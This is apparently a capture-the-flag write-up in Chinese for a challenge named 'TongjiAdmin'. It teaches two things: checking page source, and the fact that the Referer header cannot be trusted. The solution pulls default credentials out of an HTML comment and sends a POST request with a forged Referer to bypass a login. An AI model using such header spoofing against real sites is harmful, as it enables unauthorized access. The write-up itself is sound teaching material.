# TongjiAdmin

## Message

YOU SHALL NOT PASS!

## 考点

- 查看网站源码的习惯；

- HTTP Request Header 中 `Referer` 字段不可信。只能用于参考性的数据分析，不可用于安全用途。


## Writeup

1. 查看源码，发现注释：

   ```HTML
    <!-- 以防忘记： Admin:admin. -->
    <!-- 我才不担心有人发现这个注释。让那些可恶的黑客们知道了登陆信息又怎样，反正只有通过同济的网站才能登陆。 -->
   ```

2. 向目标 ip 和 port 发送以下 HTTP Requst 即可返回 flag。 

   ```http
   POST / HTTP/1.1
   Host: target_ip:target_port
   Referer: any.tongji.edu.cn
   
   username=Admin&password=admin
   ```
   

